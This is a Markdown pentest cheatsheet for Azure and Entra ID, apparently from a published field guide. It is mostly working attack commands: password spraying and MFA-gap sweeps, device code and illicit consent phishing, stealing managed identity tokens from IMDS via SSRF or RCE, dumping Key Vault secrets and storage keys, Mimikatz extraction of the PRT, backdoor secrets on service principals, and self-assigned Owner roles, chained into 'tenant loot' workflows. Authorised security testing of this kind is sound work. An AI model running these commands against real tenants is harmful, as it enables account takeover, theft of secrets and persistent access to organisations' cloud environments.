---
tags:
  - hack-notes
  - cloud
---

# Azure and Entra ID Cheatsheet

## Table of Contents

- [Authentication and Login](#authentication-and-login)
- [Account and Subscription Enumeration](#account-and-subscription-enumeration)
- [Entra ID Directory Enumeration](#entra-id-directory-enumeration)
- [Enumeration Tooling](#enumeration-tooling)
- [MFASweep](#mfasweep)
- [Illicit Consent Grant and Device Code Phishing](#illicit-consent-grant-and-device-code-phishing)
- [Managed Identity Abuse via IMDS](#managed-identity-abuse-via-imds)
- [Storage Accounts](#storage-accounts)
- [Key Vault](#key-vault)
- [Dynamic Groups Abuse](#dynamic-groups-abuse)
- [Primary Refresh Token](#primary-refresh-token)
- [Microsoft Graph API](#microsoft-graph-api)
- [Conditional Access Enumeration](#conditional-access-enumeration)
- [Subscription and Role Enumeration](#subscription-and-role-enumeration)
- [BloodHound Azure Edges](#bloodhound-azure-edges)
- [Common Workflows](#common-workflows)
- [Quick Reference](#quick-reference)

---

## Authentication and Login

### Azure CLI (az)

bash

```bash
# Interactive browser login
az login

# Device code flow (no local browser, paste a code at the URL shown)
az login --use-device-code

# Login with a username and password (blocked by MFA and Conditional Access)
az login -u user@target.com -p 'Password123!'

# Login as a service principal with a client secret
az login --service-principal -u <appId> -p <secret> --tenant <tenantId>

# Login as a service principal with a certificate
az login --service-principal -u <appId> -p cert.pem --tenant <tenantId>

# Use a managed identity (when running on an Azure resource)
az login --identity

# Log out and clear the local token cache
az logout
az account clear
```

### Az PowerShell

powershell

```powershell
# Install the module
Install-Module -Name Az -Scope CurrentUser

# Interactive login
Connect-AzAccount

# Device code login
Connect-AzAccount -UseDeviceAuthentication

# Service principal login
$cred = Get-Credential   # username = appId, password = secret
Connect-AzAccount -ServicePrincipal -Credential $cred -Tenant <tenantId>

# Microsoft Graph PowerShell login
Connect-MgGraph -Scopes "User.Read.All","Directory.Read.All"
```

---

## Account and Subscription Enumeration

bash

```bash
# Show the signed in identity, tenant, and active subscription
az account show

# List every subscription the principal can see
az account list --output table

# Switch the active subscription
az account set --subscription <subscriptionId>

# List tenants the principal can access
az account tenant list

# Access token for a given resource (reuse against REST APIs)
az account get-access-token
az account get-access-token --resource https://graph.microsoft.com
az account get-access-token --resource https://vault.azure.net
```

---

## Entra ID Directory Enumeration

bash

```bash
# Current user
az ad signed-in-user show

# List users (directory read permission required)
az ad user list --output table

# Show a specific user
az ad user show --id user@target.com

# List groups and members
az ad group list --output table
az ad group member list --group "Domain Admins"

# List service principals and app registrations
az ad sp list --all --output table
az ad app list --output table

# Show a service principal's credentials metadata
az ad sp credential list --id <appId>

# List directory role assignments
az role assignment list --all --output table
```

---

## Enumeration Tooling

### AzureHound

bash

```bash
# Collect Azure data for BloodHound
azurehound -u user@target.com -p 'Password123!' list --tenant <tenantId> \
  -o azure-data.json

# Use an existing refresh token instead of credentials
azurehound -r <refreshToken> list --tenant <tenantId> -o azure-data.json

# Import azure-data.json into BloodHound
```

### ROADtools (roadrecon)

bash

```bash
# Install
pip install roadrecon

# Authenticate and gather the directory into a local database
roadrecon auth -u user@target.com -p 'Password123!'
roadrecon gather

# Authenticate with a device code
roadrecon auth --device-code

# Launch the analysis GUI
roadrecon gui

# Use a captured PRT cookie
roadrecon auth --prt-cookie <x-ms-RefreshTokenCredential>
```

### Stormspotter

bash

```bash
# Collect with the stormcollector, then load into the Neo4j backed UI
cd stormcollector
python sscollector.pyz cli -u user@target.com -p 'Password123!' \
  --tenantid <tenantId>
# Upload the resulting zip in the Stormspotter web UI
```

### MicroBurst (PowerShell)

powershell

```powershell
Import-Module .\MicroBurst.psm1

# Enumerate everything the current context can reach
Get-AzDomainInfo

# Hunt for storage accounts and anonymous blob access
Invoke-EnumerateAzureBlobs -Base target
Invoke-EnumerateAzureSubDomains -Base target

# Dump Key Vault secrets the context can read
Get-AzKeyVaultContent

# Pull automation account credentials and runbooks
Get-AzPasswords
```

### AADInternals (PowerShell)

powershell

```powershell
Install-Module AADInternals
Import-Module AADInternals

# Tenant recon without authentication (uses public endpoints)
Invoke-AADIntReconAsOutsider -DomainName target.com

# Check whether a tenant exists and list verified domains
Get-AADIntLoginInformation -UserName user@target.com

# Authenticate and pull an access token
$at = Get-AADIntAccessTokenForAADGraph -Credentials (Get-Credential)

# Dump users once authenticated
Get-AADIntUsers -AccessToken $at
```

---

## MFASweep

powershell

```powershell
# Test a single credential across many Microsoft auth endpoints to find
# protocols that skip MFA (legacy auth, EAS, autodiscover, etc.)
Import-Module .\MFASweep.ps1
Invoke-MFASweep -Username user@target.com -Password 'Password123!'

# Include ADFS in the sweep
Invoke-MFASweep -Username user@target.com -Password 'Password123!' -IncludeADFS
```

---

## Illicit Consent Grant and Device Code Phishing

### Illicit Consent Grant

Trick a user into consenting to an attacker app, granting Graph scopes
(for example Mail.Read) against their identity without a password.

bash

```bash
# Register a multi tenant app, request the scopes you want, then send the
# victim an authorize URL. After consent you receive a token for their data.
# Example authorize URL the victim clicks:
# https://login.microsoftonline.com/common/oauth2/v2.0/authorize?
#   client_id=<appId>&response_type=code&redirect_uri=<your>&
#   scope=offline_access%20Mail.Read%20Files.Read.All&response_mode=query
```

### Device Code Phishing (TokenTactics)

powershell

```powershell
Import-Module .\TokenTactics.psd1

# Request a device code, then send the user_code and URL to the victim
Get-AzureToken -Client MSGraph
# Victim browses to https://microsoft.com/devicelogin and enters the code

# After the victim authenticates you receive access and refresh tokens
# Refresh into other first party clients to widen scope
RefreshTo-MSGraphToken -domain target.com -refreshToken <token>
RefreshTo-AzureManagementToken -domain target.com -refreshToken <token>
RefreshTo-MSTeamsToken -domain target.com -refreshToken <token>
```

---

## Managed Identity Abuse via IMDS

A VM, App Service, Function, or container with a managed identity can mint
tokens for Azure resources from the Instance Metadata Service. Reach it through
an SSRF, RCE, or a command on the host. The Metadata: true header is mandatory.

bash

```bash
# Token for the ARM management plane
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# Token for Key Vault
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net"

# Token for Storage
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com/"

# Token for Microsoft Graph
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/"

# Instance metadata (subscription, resource group, location)
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
```

### App Service and Functions IMDS

bash

```bash
# App Service uses a different endpoint with an identity header secret
curl -s -H "X-IDENTITY-HEADER: $IDENTITY_HEADER" \
  "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2019-08-01"
```

### Using the Token

bash

```bash
# Extract access_token from the JSON, then call the resource API directly
TOKEN=$(curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \
  | jq -r .access_token)

# List subscriptions with the stolen ARM token
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://management.azure.com/subscriptions?api-version=2020-01-01"
```

---

## Storage Accounts

bash

```bash
# List storage accounts in the subscription
az storage account list --output table

# Pull the account access keys (full control of the account)
az storage account keys list --account-name targetstore

# List containers using a key
az storage container list --account-name targetstore \
  --account-key <key> --output table

# List blobs in a container
az storage blob list --account-name targetstore --container-name data \
  --account-key <key> --output table

# Download a blob
az storage blob download --account-name targetstore --container-name data \
  --name secrets.txt --file ./secrets.txt --account-key <key>
```

### SAS Tokens and Anonymous Access

bash

```bash
# Generate a SAS token for read access scoped to an account
az storage account generate-sas --account-name targetstore \
  --services b --resource-types sco --permissions rl \
  --expiry 2026-12-31T00:00Z --account-key <key>

# Anonymous blob access when the container is set to public
curl "https://targetstore.blob.core.windows.net/data/secrets.txt"

# List a public container via the REST list endpoint
curl "https://targetstore.blob.core.windows.net/data?restype=container&comp=list"
```

---

## Key Vault

bash

```bash
# List vaults in the subscription
az keyvault list --output table

# List secrets in a vault
az keyvault secret list --vault-name target-kv --output table

# Read a secret value
az keyvault secret show --vault-name target-kv --name db-password \
  --query value --output tsv

# Dump every readable secret
for s in $(az keyvault secret list --vault-name target-kv --query '[].name' -o tsv); do
  echo "[$s]"; az keyvault secret show --vault-name target-kv --name "$s" \
    --query value -o tsv
done

# List and export keys and certificates
az keyvault key list --vault-name target-kv --output table
az keyvault certificate list --vault-name target-kv --output table
```

### Key Vault via REST (using a managed identity token)

bash

```bash
# With a vault.azure.net token from IMDS, hit the data plane directly
curl -s -H "Authorization: Bearer $VAULT_TOKEN" \
  "https://target-kv.vault.azure.net/secrets?api-version=7.4"

curl -s -H "Authorization: Bearer $VAULT_TOKEN" \
  "https://target-kv.vault.azure.net/secrets/db-password?api-version=7.4"
```

---

## Dynamic Groups Abuse

Dynamic groups assign membership from user attributes. If a privileged group's
rule keys off an attribute a low privileged user can edit (for example
otherMails, or a guest invite domain), setting that attribute pulls the
attacker into the group and inherits its access.

bash

```bash
# Find dynamic groups and read their membership rules
az ad group list --query "[?membershipRule!=null].{name:displayName, rule:membershipRule}"

# Inspect a rule, for example: (user.otherMails -any (_ -contains "admin"))
# If you can set the matching attribute on your own account, you become a member
```

powershell

```powershell
# Update a controllable attribute via Microsoft Graph PowerShell
Update-MgUser -UserId user@target.com -OtherMails @("admin@target.com")
# Membership recalculates and grants the dynamic group's access
```

---

## Primary Refresh Token

The PRT is a long lived token issued to a device joined identity. Stealing it,
or the PRT cookie, lets you mint tokens as that user and ride past MFA.

powershell

```powershell
# On a compromised Entra joined host, request a PRT cookie via the BrowserCore
# helper or AADInternals
$prt = Get-AADIntUserPRTToken

# Use the PRT cookie with roadrecon or TokenTactics to request app tokens
# roadrecon auth --prt-cookie <x-ms-RefreshTokenCredential>

# Mimikatz can extract the PRT, session key, and derive the cookie
# mimikatz # privilege::debug
# mimikatz # sekurlsa::cloudap
# mimikatz # dpapi::cloudapkd /keyvalue:<key> /context:<ctx>
```

---

## Microsoft Graph API

bash

```bash
# Use the az CLI Graph passthrough (no extra token handling)
az rest --method get --url "https://graph.microsoft.com/v1.0/me"

# Enumerate users
az rest --method get --url "https://graph.microsoft.com/v1.0/users"

# Enumerate groups and their members
az rest --method get --url "https://graph.microsoft.com/v1.0/groups"

# List app registrations and service principals
az rest --method get --url "https://graph.microsoft.com/v1.0/applications"
az rest --method get --url "https://graph.microsoft.com/v1.0/servicePrincipals"

# Directory roles and their members
az rest --method get \
  --url "https://graph.microsoft.com/v1.0/directoryRoles"

# Raw call with a stolen bearer token
curl -s -H "Authorization: Bearer $GRAPH_TOKEN" \
  "https://graph.microsoft.com/v1.0/me"
```

### Adding Credentials to a Service Principal

bash

```bash
# With enough Graph rights, add a client secret to a privileged SP for backdoor
az ad app credential reset --id <appId> --append

# Or add a password to a service principal directly
az ad sp credential reset --id <appId>
```

---

## Conditional Access Enumeration

bash

```bash
# Read Conditional Access policies via Graph (needs Policy.Read.All)
az rest --method get \
  --url "https://graph.microsoft.com/v1.0/identity/conditionalAccess/policies"

# Look for gaps: excluded users, excluded apps, missing MFA grant controls,
# legacy auth not blocked, and trusted locations that you can reach from
```

powershell

```powershell
# Microsoft Graph PowerShell
Get-MgIdentityConditionalAccessPolicy | Select-Object DisplayName, State

# Outsider recon of which auth methods are allowed (no creds)
# AADInternals: Invoke-AADIntReconAsOutsider -DomainName target.com
```

---

## Subscription and Role Enumeration

bash

```bash
# List role assignments across the subscription
az role assignment list --all --output table

# Assignments for a specific principal
az role assignment list --assignee user@target.com --all --output table

# List role definitions (find Owner, Contributor, User Access Administrator)
az role definition list --output table

# Resource scoped assignments
az role assignment list --scope \
  /subscriptions/<subId>/resourceGroups/<rg> --output table

# Grant yourself a role if you hold Owner or User Access Administrator
az role assignment create --assignee <objectId> --role Owner \
  --scope /subscriptions/<subId>

# Enumerate all resources in the subscription
az resource list --output table
```

---

## BloodHound Azure Edges

Load AzureHound output into BloodHound and hunt these high value Azure edges.

bash

```bash
# Common abusable edges to query in the BloodHound UI:
# AZGlobalAdmin        - full control of the tenant
# AZPrivilegedRoleAdmin - can assign any directory role, including Global Admin
# AZAddSecret          - add credentials to an app or SP, then auth as it
# AZAddOwner           - take ownership of a group, app, or SP
# AZOwns               - ownership grants control of the object
# AZUserAccessAdministrator - manage role assignments on Azure resources
# AZVMContributor      - run commands on a VM (managed identity token theft)
# AZKeyVaultContributor - manage a vault and read its secrets
# AZResetPassword      - reset another user's password
# AZMGAddSecret        - Graph app role abuse to add SP secrets

# Useful prebuilt query: shortest path to Global Admin from owned principals
```

---

## Common Workflows

### Phished Token to Tenant Loot

bash

```bash
# 1. Obtain a token via device code phishing or illicit consent (TokenTactics)
#    Refresh into MSGraph and AzureManagement clients to widen reach

# 2. Enumerate the tenant directory and resources
az ad signed-in-user show
az ad user list -o table
az account list -o table
az resource list -o table

# 3. Pull AzureHound and map paths to Global Admin in BloodHound
azurehound -r <refreshToken> list --tenant <tenantId> -o azure-data.json

# 4. Loot Key Vaults and storage the identity can read
az keyvault list -o table
az storage account list -o table
```

### Managed Identity to Key Vault and Storage

bash

```bash
# 1. From an SSRF or RCE on an Azure resource, mint a Key Vault token via IMDS
VAULT_TOKEN=$(curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net" \
  | jq -r .access_token)

# 2. List and read every secret the identity can reach
curl -s -H "Authorization: Bearer $VAULT_TOKEN" \
  "https://target-kv.vault.azure.net/secrets?api-version=7.4"

# 3. Mint a storage token and pull blobs
STORE_TOKEN=$(curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com/" \
  | jq -r .access_token)

# 4. Mint an ARM token and enumerate the whole subscription for more targets
ARM_TOKEN=$(curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \
  | jq -r .access_token)
curl -s -H "Authorization: Bearer $ARM_TOKEN" \
  "https://management.azure.com/subscriptions?api-version=2020-01-01"
```

### Password Spray to Foothold

bash

```bash
# 1. Outsider recon to confirm the tenant and harvest a user list
#    AADInternals: Invoke-AADIntReconAsOutsider -DomainName target.com

# 2. Spray (low and slow, respect lockout) then find MFA gaps with MFASweep

# 3. On a hit, log in and enumerate, then chase managed identities and vaults
az login -u hit@target.com -p 'Spring2026!'
az account show
```

---

## Quick Reference

bash

```bash
az login --use-device-code               # Device code login
az account show                          # Current identity and subscription
az account get-access-token --resource R # Token for a resource
az ad signed-in-user show                # Who am I in the directory
az ad user list -o table                 # Enumerate users
az keyvault secret list --vault-name V   # List vault secrets
az keyvault secret show --vault-name V --name N --query value -o tsv  # Read secret
az storage account keys list --account-name A   # Storage account keys
az role assignment list --all -o table   # Role assignments
az rest --method get --url URL            # Raw Graph or ARM call
azurehound -r TOKEN list --tenant T -o data.json  # BloodHound collection
```

### Managed Identity IMDS Resources

bash

```bash
# Base: http://169.254.169.254/metadata/identity/oauth2/token
#   ?api-version=2018-02-01&resource=<resource>   (header: Metadata: true)
https://management.azure.com/    # ARM control plane
https://vault.azure.net          # Key Vault data plane
https://storage.azure.com/       # Storage data plane
https://graph.microsoft.com/     # Microsoft Graph
```

### Key Endpoints and Tools

bash

```bash
login.microsoftonline.com        # Auth and token endpoints
microsoft.com/devicelogin        # Device code redemption (phishing)
graph.microsoft.com              # Directory and identity API
TokenTactics                     # Device code phishing and token refresh
roadrecon / AzureHound           # Directory collection for analysis
AADInternals                     # Outsider recon and token tooling
MicroBurst / MFASweep            # PowerShell enum and MFA gap discovery
```

---

## Related

- Checklists: [Azure and M365 Entra ID](../Checklists/Azure%20and%20M365%20Entra%20ID.md)
- [AWS Pentest](AWS%20Pentest.md)
- [Active Directory and Kerberos](Active%20Directory%20and%20Kerberos.md)
- [Kubernetes and Container Breakout](Kubernetes%20and%20Container%20Breakout.md)
- [Phishing and Initial Access](Phishing%20and%20Initial%20Access.md)

---
*Part of the [Pentest Field Guide](https://github.com/Su1ph3r/hack-notes-field-guide), maintained by [Cairn Security](https://cairnsecurity.com). Independent penetration testing.*
